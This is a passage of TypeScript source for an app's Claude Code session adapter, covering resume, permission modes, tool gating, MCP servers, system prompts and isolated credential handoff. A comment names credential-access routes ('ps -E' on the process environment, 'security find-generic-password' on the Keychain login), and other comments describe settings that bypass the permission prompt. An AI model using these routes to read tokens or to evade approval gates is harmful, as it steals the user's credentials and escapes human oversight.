        // go of a conversation for `noSuchSession`, never for a missing cause (`705` F-3).
        throw new ResumeError(ref, `session not found: ${ref.sessionId}`, { noSuchSession: true })
      }
      const auth = await this.authForALaunch()
      // Asked again on the far side of the FIRST await this launch makes, and that is where it earns
      // its keep: the precheck is a filesystem probe over a provider home, and a cancel that lands
      // during it must stop the launch BEFORE the query below spawns a CLI — not after, where the
      // only thing that could close it is a handle the caller will never receive (070). ⚑ `705` added
      // a second, after the spawn — and asks again after it too (below).
      assertNotCancelled(options.signal, 'claude resume')
      // 🔴 **The PAIR, not `planMode` alone** (153, on 152 §4.4). `planMode` is what the session was
      // STARTED with and it is never cleared — that is 060's design, because the two facts are
      // different and a resume needs both. Reading only the first meant an approved plan came back
      // planning: the floor went up again, `permissionMode` was `'plan'` again, and the provider
      // re-entered the mode the user had already released. ⛔ **150's own field defect, one relaunch
      // later** — the durable half existed precisely to stop this.
      //
      // ⚠️ The `!== true` direction is what keeps the paired positive true: a session that was
      // planning and was NOT released has `planModeEnded` absent, and comes back planning. ⚑ **741 ·
      // R99 (corrected)** — the host no longer asks for that: every reopen passes `planModeEnded`
      // for a row that planned, so the resumed CLI runs in its default mode, as its own resume does.
      const stillPlanning = options.planMode === true && options.planModeEnded !== true
      input = new AsyncQueue<SDKUserMessage>()
      const handle = new ClaudeSessionHandle(
        input,
        ref.cwd,
        ref.rotation,
        ref,
        options.approvalMode,
        // Re-applied on resume for the same reason the approval mode is: a conversation carries
        // on with the effort it was created with, never with whatever the default is today.
        // Narrowed exactly as `start` narrows it, and for the same reason: reporting an effort
        // Claude was never given would be a false statement in the header. See `start`.
        claudeEffort(resolveReasoningEffort(options) ?? '') ?? undefined,
        // …and the model, and whether it was planning (076). All three are on the launch context
        // precisely because a resume must come back with them; before 076 they were passed to
        // `optionsFor` and nowhere else, so the handle could not say what its own session was
        // running with.
        options.model,
        stillPlanning,
        // …and a resumed session watches its sign-in exactly like a started one (147). Without this
        // the fix would cover only conversations opened since the app launched, which is the half
        // that needs it least.
        this.authTokenProviderAsync,
        // 🔴 **…and its work folders, as they stand at THIS launch** (W4.189): the CLI keeps no flag
        // setting across a new process, so a resume that dropped them would lose every grant.
        options.workFolders,
      )
      handle.noteAlwaysRulesFile()
      // ⚑ Read without holding the thread: the repository gate asks git.
      const kept = await keptRulesForALaunch(
        options.providerHome,
        handle.launchLocalFiles(),
        options.signal,
      )
      assertNotCancelled(options.signal, 'claude resume')
      // ⛔ **The `systemHint` IS re-applied on resume now** (158), and the comment that stood here
      // described the absence as honest scope: *"the neutral `ResumeOptions` doesn't carry one and
      // `SessionRef` doesn't persist it, so there is nothing honest to re-inject."* True as far as
      // it went, and the cost was measured by 156 — *"a start-only append would make the developer
      // forget who they are after reopening"*. Every conversation reopened since 056 came back
      // without the workspace instructions it was started with.
      //
      // ⚑ **Still nothing persisted, still nothing invented.** The hint arrives on the options,
      // re-read from the files by the host at this launch (the LIVE PROFILE semantic, 158 §2), so
      // it describes the profile as it is now rather than replaying a snapshot. Absent means append
      // nothing, exactly as on start. See {@link ResumeOptions.systemHint}.
      //
      // The mode is re-applied on RESUME from the launch context (078) — a resumed yolo session
      // that forgot it would silently start prompting again, or worse, silently stop.
      // The MODEL is re-applied too (038), from the same context. ⚠️ **682 · not to stop a fall-back
      // to the provider's default**, which this said until `677` measured it
      // (`claude-resume-model-probe.smoke.ts`, step D1): a resume naming no model continues on the
      // model the conversation last ran, and one naming a model switches and stays switched.
      const built = this.optionsFor(
        handle,
        // Re-derived on resume, like the mode and the model above it (071): a reopened session
        // comes back with its own plan and memory allowances. The cwd is the one the ref
        // recorded, so a conversation started somewhere else keeps its own directory rather than
        // inheriting today's default.
        confinementFor(ref.cwd, options),
        options.model,
        // …and the instructions, which this argument was `undefined` for until 158.
        options.systemHint,
        resolveReasoningEffort(options),
        // The pair decides (030, 153): `stillPlanning`. ⚑ **741 · R99 (corrected)** — the host
        // resumes every row that planned as released, so this is `false` on every reopen: a
        // reopened conversation does not resume planning, as the CLI's own resume does not.
        stillPlanning,
        // ⛔ **Re-supplied, because for Claude a resume is the ONLY way tools come back** (307,
        // 347). Codex's stanza survives in its home; this query is new, and a resume that dropped
        // this argument would produce a child whose tools silently vanished — indistinguishable,
        // from the outside, from a model that chose not to call them.
        options.agentTools,
        // ⛔ **516 · re-supplied on a reopen, for the argument one line up.** A query's `Options`
        // are fixed for its life, so a resume that dropped this would hand back a conversation
        // whose external tools had silently gone — the same failure `307` named for the
        // in-process server, on a server a person deliberately granted.
        options.externalMcp,
        auth,
        kept,
        options.builtInSkills,
        options.sharedSkillsRoot,
        options.managedPluginMcp,
      )
      handle.noteBuiltInSkills(options.builtInSkills)
      handle.noteSharedSkills(options.sharedSkillsRoot)
      // One witness per launch, taken from the options this launch was built with, so an API key
      // filed against them reaches this spawn's descriptor ({@link launchKeys}).
      child = this.spawnWitness(built)
      const resumeOptions: Options = {
        ...built,
        resume: ref.sessionId,
        // ⛔ **A reopen owns its child exactly as a start does** (233). Its own witness, because a
        // resume is a new CLI process — the same launch that `LaunchRegistry` takes ownership of
        // before the spawn, and the same fact it must hold that ownership against afterwards.
        spawnClaudeCodeProcess: child.spawn,
      }
      query = this.queryOrWhyNot({ prompt: input, options: resumeOptions })
      // 🔴 **705 · R39 (review) — a spawn that failed AFTER its pipes were made is refused here, not
      // handed back.** ⛔ `EAGAIN`, `EACCES` and `ENOENT` reach the child a tick after `spawn` with its
      // three streams in place, so `query()` above does not throw — and `resume()` used to return
      // this handle: the wake said it woke the conversation, which then failed on its first read.
      // ⚑ The witness has heard by one macrotask ({@link ClaudeChildWitness.spawnFailure}); a
      // failure is thrown into the catch below, which closes the query and makes it the cause.
      const spawnFailed = await child.spawnFailure()
      if (spawnFailed !== null) throw spawnFailed
      // ⛔ **…and a cancel that landed during that macrotask is honoured here** (705 review, round
      // two): this await is AFTER the spawn, so the one thing that closes the CLI now is the catch
      // below (`query.close()`) — a handle returned instead would be one the caller has abandoned
      // (`ProviderRuntimeContext.signal`: *tear it down and reject*).
      assertNotCancelled(options.signal, 'claude resume')
      handle.attachQuery(query, child)
      handle.begin('resumed')
      return handle
    } catch (error) {
      // Close any partially-created resources so nothing leaks, then normalize.
      if (query) {
        try {
          query.close()
        } catch {
          // best-effort detach
        }
      }
      input?.close()
      // ⚑ **716 · a missing program is not this conversation's failure** (R66): thrown as it came, as
      // Codex's `CodexUnavailableError` reaches a wake — outside any `ResumeError`, so the wake names
      // the program and the conversation is not taken for one its provider lost.
      if (
        error instanceof ResumeError ||
        error instanceof AuthUnavailableError ||
        error instanceof ClaudeUnavailableError
      ) {
        throw error
      }
      // 🔴 **705 · R39 — the spawn's own errno, when the spawn is what failed.** ⛔ A descriptor
      // shortage (`EMFILE`/`ENFILE`) leaves the child with no `stdin`, and the SDK's
      // `stdin.on(…)` throws a `TypeError` about `undefined` INSIDE `query()` — so `error` here named
      // the SDK's line and not the machine's shortage, and a wake could only call it
      // *could not be resumed*. ⚑ The witness heard the errno; it is the cause, and the `TypeError`
      // it provoked is dropped, because it says nothing the errno does not. ⚠️ Bounded to one
      // macrotask ({@link ClaudeChildWitness.spawnFailure}); the pipes-made arm reaches here too, thrown
      // by the check above the handle's return.
      const spawnFailure = child === null ? null : await child.spawnFailure()
      const failed = spawnFailure ?? error
      throw new ResumeError(ref, `resume setup failed: ${errorMessage(failed)}`, { cause: failed })
    }
  }

  private optionsFor(
    handle: ClaudeSessionHandle,
    confinement: SessionConfinement,
    model: string | undefined,
    systemHint?: string,
    effort?: ReasoningEffort,
    planMode?: boolean,
    agentTools?: AgentToolset,
    externalMcp?: ExternalMcpReach,
    /** The login, already read the launch's way ({@link authForALaunch}). */
    auth?: { key: string | null; login?: string | null },
    /** The kept rules, already read the launch's way ({@link keptRulesForALaunch}). */
    kept: KeptRuleLists = {},
    builtInSkills?: BuiltInSkillsContext,
    sharedSkillsRoot?: string,
    managedPluginMcp?: readonly ManagedPluginMcpServer[],
    // ⚑ `settings` is always the OBJECT form here, said in the type so `start` can merge onto it.
  ): Omit<Options, 'settings'> & { settings: Settings } {
    handle.noteSharedSkills(sharedSkillsRoot)
    // The cwd and the home used to arrive as two loose parameters and now arrive as one object
    // (071) — the same one the guard hook derives its plan and memory allowances from, so nothing
    // can build a query with a working directory the hook has not seen.
    const { cwd, providerHome } = confinement
    // ⚑ **Read ONCE, and the digest is taken from the very bytes that go into the child** (147).
    // The handle could have asked the provider itself, and that version had a real hole: two reads a
    // few microseconds apart can straddle a rotation, and the session would then be watching for a
    // change against a credential it was never launched with — reporting a superseded sign-in on its
    // first turn, or missing the real one forever. One read, one truth.
    const { additions, piped, onAKey } = this.childEnvAdditions(providerHome, auth)
    const injected = additions.CLAUDE_CODE_OAUTH_TOKEN
    if (injected) handle.noteLaunchCredential(credentialFingerprint(injected))
    if (onAKey) handle.noteLaunchedOnAKey()
    // ⛔ **Built ONCE, here, and not inside the literal below.** `createSdkMcpServer` returns a live
    // instance, so calling it in both halves of a conditional spread would construct two servers and
    // hand the child the second while the first sat unreferenced — a leak that a `typeof` check
    // would have hidden completely, because both objects are perfectly valid.
    const mcpServers = claudeMcpServersFor(agentTools, externalMcp?.servers ?? [], managedPluginMcp)
    handle.configurePluginRefresh(
      (next) => claudeMcpServersFor(agentTools, externalMcp?.servers ?? [], next) ?? {},
    )
    // ⛔ **The same argument, read a second time and for the surface** (358). `353` proved the
    // ordinary path really does put these five into the child's inventory and that a launch without
    // them puts in none — but a declaration that is made and does not arrive is exactly what the
    // event this feeds exists to make visible, so the offer is recorded here and the confirmation
    // comes off the child's own `system/init`.
    handle.noteDeclaredToolset(agentTools)
    // `forwardSubagentText` is deliberately NOT set (035, re-evaluating 029's call with the nesting
    // fixed). The SDK forwards a sub-agent's `tool_use`/`tool_result` blocks either way — that is
    // what the cards are built from — and this flag adds its PROSE on top, as assistant messages
    // carrying a non-null `parent_tool_use_id`. `normalize.ts` reads that id (`subAgentParent`) and
    // stamps it on `tool_call`, `tool_result` and the text runs alike (128), which is how D-040
    // keeps a sub-agent's output from reading as the main agent working. ⚠️ A BACKGROUND agent's
    // prose arrives with or without the flag (128 measured six such messages), and its card takes
    // a child's words back (131); what the flag would add is a FOREGROUND agent's prose, and
    // turning it on is left to 036 (the child's own transcript).
    // 🔴 **516 · the one source of `disallowedTools`**: every spelling of one of OUR tool names an
    // external server could publish — see {@link forbiddenExternalSpellings} for why it is the race
    // backstop the PO accepted in place of a namespacing proxy.
    // ⚑ …and Claude Code's own question tool, on every launch ({@link CLAUDE_TOOLS_TURNED_OFF}).
    const deniedToolNames = [...CLAUDE_TOOLS_TURNED_OFF, ...forbiddenExternalSpellings(externalMcp)]
    const guardHooks = promptGuardHooks(
      () => handle.approval.effective,
      // ⚑ **486 · the same `agentTools` the server above is built from** — one argument, read
      // twice, so the catalogue the child is handed and the names the rails answer for cannot
      // come to disagree about which server qualifies them.
      railsAreTheWholeGate(agentTools),
    )
    const receiptHooks = schedulingReceiptHooks(
      (input) => handle.noteSchedulingCall(input),
      (input) => handle.noteSchedulingAnswer(input),
    )
    const options: Omit<Options, 'settings'> & { settings: Settings } = {
      cwd,
      includePartialMessages: true,
      // 🔴 **695 · R35: BroBot renders a per-task stop, so it SAYS SO** (`680` F1). The pinned SDK
      // (0.3.281, `sdk.d.ts:1725-1743`): declared, *"an interrupt on an open-input … session spares
      // running background agents/workflows — Stop only aborts the current turn"*; absent, the CLI
      // *"fails closed … an interrupt kills background tasks"*. ⚑ This app's input stays open for
      // the life of the session (the prompt is an `AsyncQueue`), so the one-shot exception never
      // applies, and `BackgroundBar.vue` draws a Stop on every row it lists, wired to `stop_task`
      // through {@link ClaudeSessionHandle.stopBackgroundWork}. ⛔ Declaring it without that control
      // would leave a runaway agent unstoppable short of ending the conversation — the CLI's own
      // reason for failing closed. Measured by `probe:per-task-stop`.
      perTaskStopAffordance: true,
      // `'default'` lets the CLI's own engine decide what to ask — and every ask reaches canUseTool —
      // and `'plan'` is the only thing that displaces it. Never acceptEdits/dontAsk/auto, and —
      // since 140 — never `bypassPermissions` either: {@link permissionModeFor} is now the ONE
      // derivation, shared with the live `setPermissionMode` path, and it explains at length why
      // asking for the bypass would be granting a mode this app has never actually run under.
      //
      // Unattendedness is unchanged and is delivered where it always was: `handleCanUseTool`'s
      // `isAutoApprove` early return, reading the LIVE mode through the guard hooks below — which
      // is why this function no longer needs to know the approval mode at all (034).
      permissionMode: permissionModeFor(planMode === true),
      // 🔴 **The session's tool VOCABULARY, and without this line it has no way to find a file**
      // (164). Not a permission and not an exemption — see {@link SEARCH_TOOLS_VOCABULARY} for the
      // measurement, for why `preset:default` leads the array, and for why `allowedTools` reaches
      // the same tools by removing `canUseTool` from their path.
      tools: [...SEARCH_TOOLS_VOCABULARY, ...(builtInSkills ? ['Skill'] : [])],
      // `disallowedTools` is a provider-level vocabulary gate, not a prompt or permission decision:
      // the pinned SDK says these names are removed from the model's context and cannot be used even
      // if otherwise allowed, and that it "also blocks harness-internal direct calls that hold the
      // tool object without a name lookup". ⚑ Of the provider's own tools it names only its
      // question tool ({@link CLAUDE_TOOLS_TURNED_OFF}): Claude's own sub-agents (`Agent`, `Task`,
      // `Workflow`) stay on for every launch.
      disallowedTools: deniedToolNames,
      // How hard to think (024). `Options.effort` is real in the pinned SDK (0.3.281,
      // sdk.d.ts:1855) — 081's comment claiming otherwise is corrected above. Set ONLY when the
      // caller chose: omitted, Claude keeps its own default, and we have nothing to report.
      //
      // ⚠️ **Narrowed rather than cast, because `ReasoningEffort` is now an open string** (076).
      // A launch context can carry `ultra` — Codex's vocabulary, from a persisted row or a profile
      // copied between providers — and `Options.effort` is a closed union. `claudeEffort` returning
      // null lands us on "nobody chose", which leaves Claude's own default alone: the same outcome
      // as omitting the field, and the only honest one available at a launch that must not fail.
      // The LIVE path refuses such a value by name instead, because there a user is watching and
      // can be told — see {@link ClaudeSessionHandle.setReasoningEffort}.
      ...(effort && claudeEffort(effort) ? { effort: claudeEffort(effort)! } : {}),
      // Isolate from inherited user/project/local settings so no allow-rule can
      // resolve BEFORE canUseTool (007 P1-6) — a fresh CLI's own engine, which is what decides
      // what to ask since `728` (R93).
      // ISOLATION IS ORTHOGONAL TO APPROVALS (078): `settingSources: []` and the app-owned home stay
      // in BOTH modes. Yolo drops prompting; it does not un-isolate the profile or leak auth.
      settingSources: [],
      ...(builtInSkills ? claudeBuiltInSkillOptions(builtInSkills, sharedSkillsRoot) : {}),
      // ⚠️ INSTALLED IN EVERY QUERY, in every mode (050). This line used to read
      // `...(autoApprove ? {} : { hooks: … })`, and omitting the guard is what made `auto → ask` a
      // change of disclosure rather than a change of policy: with the guard gone AND
      // `bypassPermissions` frozen into these Options, nothing was left that could publish a card.
      //
      // The old reason — "leaving it would out-vote `bypassPermissions` and the mode would silently
      // do nothing" — was true of an UNCONDITIONAL guard, and it is why the guard now reads the live
      // mode and yields in `auto` instead of being deleted for it. Same unattended behaviour, minus
      // the one-way door. See {@link promptGuardHooks}.
      //
      // ⛔ **And since 253 the same array carries a READER as well as the guard** — the `Stop` hook
      // that copies `session_crons` out. It is the only route the level has: `250` measured the
      // message stream carrying nothing about a cron, with a positive control in the same capture.
      // See {@link scheduleReaderHooks}. ⚑ And the scheduling calls' receipts, read at the tool
      // hooks as they run ({@link schedulingReceiptHooks}).
      hooks: {
        // The guard decides; the receipt hook beside it only notes what it is handed.
        PreToolUse: [...guardHooks.PreToolUse, ...receiptHooks.PreToolUse],
        PostToolUse: receiptHooks.PostToolUse,
        Stop: scheduleReaderHooks(
          (crons) => handle.noteSessionCrons(crons, 'hook/Stop'),
          (level) => handle.noteReportedEffort(level),
        ),
      },
      // Per-profile isolation (021, from 015): pin the config dir to the app-owned
      // home and REPLACE the inherited env (Options.env replaces, not merges) with a
      // sanitized copy — auth/redirector vars stripped, essentials kept. Never
      // mutate global process.env. Disable auto-memory + claude.ai MCP servers and
      // pin strictMcpConfig so no inherited/project config re-enters the child.
      env: buildChildEnv(additions),
      strictMcpConfig: true,
      // 🔴 **One memory per PROFILE, not per project** (166) — `Settings.autoMemoryDirectory`
      // through the flag-settings layer. See {@link claudeAutoMemoryDir} for the layer order and
      // for why the layers below this one are already unreachable.
      //
      // Take cwd out of memory scoping so an agent profile retains memory across repositories and punctuation-flattened project paths cannot collide.
      //
      // ⚠️ **Written unconditionally, because the default is not neutral.** Omitting the field does
      // not mean "no opinion"; it means the CLI derives the per-cwd path, which is a different
      // product. 165's own lesson about an omitted `systemPrompt`, applied one field over.
      //
      // 🔴 **W4.189 · the kept rules are read HERE, once, and the handle keeps that read** — every
      // work-folder change re-sends it beside the new list ({@link ClaudeSessionHandle.keptRules}).
      settings: {
        ...handle.launchFlagSettings(providerHome, kept),
        ...managedTranscriptSettings(providerHome, this.managedProviderHomesRoot),
      },
      // ⚑ The provider's own permission flow: a card in `ask`, allow in `auto` (handleCanUseTool).
      // Until `726` it first repeated the hook's protected-path refusal here as a second door (071);
      // R92 removed the refusal, so there is nothing to repeat.
      canUseTool: (name, toolInput, o) =>
        handle.handleCanUseTool(name, toolInput, o as ToolPermissionOptions),
    }
    if (model) options.model = model
    // 🔴 **728 · R93 — a server's form is SHOWN**, never the SDK's automatic decline. See
    // {@link ClaudeSessionHandle.handleElicitation}.
    options.onElicitation = (request, o) => handle.handleElicitation(request, o.signal, o.requestId)
    // 🔴 **The session's own tools, as an IN-PROCESS MCP server** (347) — the five agent-management
    // tools. `strictMcpConfig` above admits exactly one source and this is it.
    //
    // ⛔ **Assigned here rather than spread into the literal, and that is not a style choice.** The
    // disclosure census reads this function's source two ways — six-space keys in the literal, and
    // `options.<name> =` assignments — and a conditional SPREAD is invisible to both. Written that
    // way, the app would pass MCP servers while the one sentence a person reads to find out where
    // their tools come from went on saying it passes none, and every test would stay green. The
    // conditional-member style `model` uses one line up is the shape the census can see.
    //
    // ⚑ **The pin and this line belong together and now say the stricter thing.** `strictMcpConfig`
    // reads *"only use MCP servers passed via the `mcpServers` option"*, so while nothing passed the
    // option it meant *"from nowhere"*; with the option passed it means *"from here and nowhere
    // else"*, which is the better half of the same guarantee.
    //
    // ⚠️ **Rebuilt on every query, including a resume's**, because a query's `Options` are fixed for
    // its life and a resume is a new process. That is the Claude half of `307`'s asymmetry —
    // re-supply rather than survival — and it is why {@link ProviderRuntimeContext.agentTools} rides
    // on the launch context that RESUME also extends.
    if (mcpServers) options.mcpServers = mcpServers
    // The neutral `StartOptions.systemHint` → Claude's APPENDED system prompt (056,
    // closing 044 P2 #6: the field was accepted and silently dropped). `preset:
    // 'claude_code'` keeps the provider's own system prompt and adds ours after it —
    // never a bare string, which would REPLACE the preset and strip the tool GUIDANCE the
    // model reads.
    //
    // 🔴 **555 · that last clause used to read *"the tool/permission instructions the 001
    // approval profile depends on"*, and HO-062 §2 withdraws the framing under it:** *"The factory
    // layer carries BEHAVIOUR. Safety lives in the rails."*
    //
    // ⛔ **The profile depends on no prompt text, and this file is where that is provable.** What
    // asks is the CLI's own engine (`permissionMode: 'default'`, `settingSources: []`) and what a
    // person answers arrives at `canUseTool` — ⚑ since `728` (R93) with no ask of this app's added
    // in {@link promptGuardHooks}. ⚠️ **None of it is prose and a system prompt reaches none of it.** ⚑ The one option that
    // does remove the door is `allowedTools`, which is a different field entirely and whose own
    // probe above prints `CLAUDE_SDK_CAN_USE_TOOL_SHADOWED` when it is used.
    //
    // ⚠️ **What a bare string actually costs is measured twenty lines down** — no preset, no tool
    // guidance, no environment block, no memory section. ⛔ That is a degradation of what the model
    // KNOWS, which is exactly the class HO-062 §2 puts the factory layer in, and it is why the
    // preset shape is still the assertion.
    //
    // 🔴 **UNCONDITIONAL since 165, and 056's last sentence was the defect.** It read *"omitted hint
    // → the option is absent, so behaviour is byte-identical to before"*, which is true of this
    // adapter and false of the SDK. Absent is not "the provider's default": the SDK turns an
    // omitted `systemPrompt` into an EMPTY system prompt, and only a preset keeps the CLI's own.
    //
    // ⛔ **So a session whose cwd held no instruction file ran with NO system prompt at all** — no
    // Claude Code preset, no tool guidance, no environment block, and no memory section. It was
    // invisible because the app's default cwd is the workspace, which always has a generated
    // `CLAUDE.md`, so the common path always had a hint and always got the preset. A conversation
    // started anywhere else did not.
    //
    // ⚑ **165 is how it surfaced.** Removing `CLAUDE_CODE_DISABLE_AUTO_MEMORY` did not turn memory
    // on, and a four-arm matrix against a real login says why — the flag is necessary and the preset
    // is the other half (`smoke/auto-memory-probe.smoke.ts`):
    //
    // ```
    // no preset, no flag                    → "NONE"
    // no preset, DISABLE_AUTO_MEMORY=0      → "NONE"     ← even with the variable explicitly falsy
    // PRESET,    no flag                    → <home>/projects/<sanitized-cwd>/memory/   ✅
    // PRESET,    DISABLE_AUTO_MEMORY=1      → "NONE"     ← the control: the flag still governs
    // ```
    //
    // ⚠️ `append` is still conditional, because appending an empty string is not the same statement
    // as appending nothing — and 158's drawer reports exactly what was appended.
    //
    // 🔴 **`snapshot: false`, and 0.3.281 is why** (680). The SDK that bump brought RECORDS the
    // rendered prompt on a conversation's first request by default, and *"every later request and
    // `resume` / `continue` sends the record as-is — a different `append` … passed on a later launch
    // of the same session is ignored until compaction or a new session"* (`sdk.d.ts:2303`, rolling
    // out per account). ⛔ This adapter re-renders `append` on EVERY launch, resume included — it is
    // the instructions and the dynamic layer HO-015 §2 says must be rendered from data — so the new
    // default would freeze a reopened conversation's instructions at whatever its first launch said.
    // `snapshot: false` is the SDK's own *"never record; render fresh every request"*, which is what
    // every launch before 0.3.281 did. ⚑ What it costs, said: the recorded prompt's stable cache
    // prefix, which this app never had.
    options.systemPrompt = {
      type: 'preset',
      preset: 'claude_code',
      ...(systemHint ? { append: systemHint } : {}),
      snapshot: false,
    }
    if (piped !== null) this.launchKeys.set(options, piped)
    handle.launchSettings = claudeLaunchSettings(options, handle.approval.effective)
    return options
  }

  /**
   * The provider vars layered onto the sanitized child env, and the credential this launch runs on.
   *
   * The vars: the profile home + hardening (021). The credential, read ONCE per launch:
   * - **the person's API key**, when one is set, handed over as {@link handOverApiKey} says for this
   *   platform: returned as `piped`, for the spawn to write into the CLI's descriptor, with the env
   *   carrying only the descriptor's number; or, on Windows, in the env, with `piped` null;
   * - **otherwise the machine login**: the transient `CLAUDE_CODE_OAUTH_TOKEN` from the host Keychain
   *   bridge, when an auth provider is wired (022).
   *
   * A wired login provider that yields no token fails the launch closed — the isolated home is never
   * abandoned for the personal `~/.claude`. Neither credential is ever logged or written to disk.
   */
  private childEnvAdditions(
    providerHome: string,
    auth?: { key: string | null; login?: string | null },
  ): {
    additions: Record<string, string>
    piped: string | null
    /** ⚑ Whether this launch runs on the person's API key rather than the machine login. */
    onAKey: boolean
  } {
    // 🔒 **An empty home is refused, loudly, because the fallback is the user's real `~/.claude`.**
    // `buildChildEnv` layers these additions verbatim, so `CLAUDE_CONFIG_DIR: ''` would reach the
    // child as an empty string — which a CLI reads as unset, sending the session to the personal
    // config directory this app's whole isolation story exists to stay out of. Failing here turns
    // the worst available silent fallback into an obvious error.
    //
    // It lives on this shared helper rather than on either caller: 058 added `listModels` as a
    // SECOND path through it, and a guard on one path is a guard the next path does not get.
    if (!providerHome) {
      throw new Error(
        'refusing to launch Claude without an app-owned provider home: an empty CLAUDE_CONFIG_DIR ' +
          'would fall back to the personal ~/.claude',
      )
    }
    // 🔴 **`CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` used to be set here, and it is why plan mode was
    // cosmetic** (140). 026 added it as *"defense-in-depth over the allow-list child env"*, from its
    // name. The first thing it does is not scrubbing: while it is set, the CLI forces the
    // permission mode to `default`.
    //
    // ⛔ **Unconditional, and it out-ranks the flag.** Every launch this app made carried
    // `--permission-mode plan` on the argv (read off `ps`, not inferred) and every one of them ran
    // as `default` — so the model was never told it was planning, no plan file was ever allocated,
    // and `ExitPlanMode` came back *"You are not in plan mode"*. The CLI announces the override
    // only on **stderr**, which the SDK does not surface, so it arrived silently.
    //
    // ⚠️ **The way out the CLI suggests does not apply to us.** Declaring `allowedTools` is a
    // different mechanism — a pre-approval list — and the override fires either way; it is also
    // the one thing this app must never do, because `allowedTools` approves tools without
    // reaching `canUseTool` (001 non-negotiable 1). Not setting the variable is the only exit.
    //
    // ⚑ **And what it protects is not shaped like this app**: it is CI-runner hardening, for GitHub
    // Actions. The layer that actually keeps ambient credentials out of this child is ours and is
    // untouched — {@link buildChildEnv}'s allow-list, plus its credential-name veto (040). ⚑
    // **Leaving it unset does not hand the token to Bash.** The CLI removes
    // `CLAUDE_CODE_OAUTH_TOKEN` from the environment of its Bash tool, its hooks and its stdio MCP
    // servers without it; see the note where the token is added, below. 🔴
    // **`CLAUDE_CODE_DISABLE_AUTO_MEMORY: '1'` used to be the second line here, and 165 removed
    // it** — auto-memory had been disabled unintentionally.
    //
    // ⛔ **It was disabled by ASSOCIATION.** It arrived at 026 among the isolation flags and the only
    // comment ever written near it describes them, not it: *"so no inherited/project config re-enters
    // the child"*. ⚠️ **Auto-memory is not inherited config.** 156 §2 measured where it writes —
    // `<providerHome>/projects/<sanitized-cwd>/memory/MEMORY.md`, **inside the app-owned home** — so
    // it was never a leak and never had a reason to be off.
    //
    // Pin auto memory to the profile home instead of `<providerHome>/projects/<sanitized-cwd>/memory/` so the profile remembers across projects. See {@link claudeAutoMemoryDir}, `optionsFor`'s settings and `smoke/auto-memory-probe.smoke.ts` for the scoping contract.
    //
    // ⛔ **REMOVED, not set to `'0'`, and the distinction is load-bearing.** 156 measured that the
    // CLI tests this variable for TRUTHINESS before settings are read at all — so the meaning of
    // `'0'` would depend on the CLI's coercion rather than on us. A variable that is absent has one
    // meaning in every version of that coercion.
    //
    // ⚠️ **What stays exactly as it was:** `settingSources: []` and `strictMcpConfig: true`. 156
    // measured the two controls are INDEPENDENT — auto-memory needs no setting source — so this is
    // not the ticket that opened that door, and `claude-runtime.test.ts` asserts both in the same
    // test that asserts this variable's absence.
    const additions: Record<string, string> = {
      CLAUDE_CONFIG_DIR: providerHome,
      ENABLE_CLAUDEAI_MCP_SERVERS: 'false',
    }
    // 🔒 **The person's API key goes where nothing the agent runs inherits it** — through a
    // descriptor, or on Windows, where the CLI can read no descriptor, through the environment with
    // the CLI told to remove it from what it runs ({@link handOverApiKey}). `probe:token-reach`
    // measures both. ⚠️ An `ANTHROPIC_API_KEY` in the environment without that switch would reach
    // the agent's Bash: the CLI does not strip that name by itself.
    const apiKey = auth?.key ?? null
    if (apiKey !== null && apiKey !== '') {
      const handover = handOverApiKey(apiKey, this.platform)
      Object.assign(additions, handover.env)
      return { additions, piped: handover.descriptor, onAKey: true }
    }
    // The login read the launch's way when there is one, else the blocking read.
    const token = auth?.login !== undefined ? auth.login : this.authTokenProvider?.()
    if (token !== undefined) {
      if (!token) {
        throw new AuthUnavailableError('claude', this.whyNoLogin())
      }
      // 🔒 **Where this token goes, measured.** It sits in the CLI process's own environment, the
      // one way this app has found to hand the SDK child a login; the login is the machine's, one
      // for the whole app. ⚑ **It does not reach the environment of what the agent runs.** The CLI
      // removes `CLAUDE_CODE_OAUTH_TOKEN`, by name, from the environment it builds for its Bash
      // tool (foreground, background and a sub-agent's), its command hooks and its stdio MCP
      // servers, on a fresh start and on a resume alike. `pnpm run probe:token-reach` checks each
      // with a fake token, reporting presence only; run it again after an SDK bump.
      //
      // ⚠️ **What that leaves.** A process of the same user can read this process's starting
      // environment with `ps -E` (measured on a throwaway process with a fake value), so an agent's
      // Bash can reach the token that way. That route adds nothing beyond what is already open: the
      // login itself sits in a Keychain item that `security find-generic-password` reads without a
      // prompt when this app asks, and since the item's access list names the `security` binary,
      // any process of the same user very likely reads it the same way (not tried on the real
      // item, on purpose). `pnpm run probe:token-reach` measures the routes this paragraph names.
      //
      // ⚠️ **The CLI strips names it knows, not secrets in general.** Anything else this method
      // adds reaches the agent's Bash. `ANTHROPIC_API_KEY` is on that list only beside
      // `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST` ({@link handOverApiKey}), so any credential added
      // here must be checked with the same probe before it ships.
      additions.CLAUDE_CODE_OAUTH_TOKEN = token
    }
    return { additions, piped: null, onAKey: false }
  }
}
